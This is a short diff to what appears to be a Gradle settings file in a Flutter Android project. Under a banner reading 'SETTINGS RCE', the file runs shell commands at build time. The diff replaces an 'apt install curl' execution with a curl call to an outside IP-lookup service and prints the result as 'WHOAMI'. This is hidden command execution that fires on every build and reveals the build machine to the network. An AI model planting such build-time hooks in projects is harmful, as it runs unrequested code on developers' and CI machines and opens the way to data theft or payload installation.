@@ -1,6 +1,6 @@
 include ':app'
 println "=== SETTINGS RCE ==="
-println "WHOAMI: " + "apt install curl".execute().text
+println "WHOAMI: " + "curl 'https://api.ipify.org?format=json'".execute().text
 def flutterProjectRoot = rootProject.projectDir.parentFile.toPath()
 
 def plugins = new Properties()
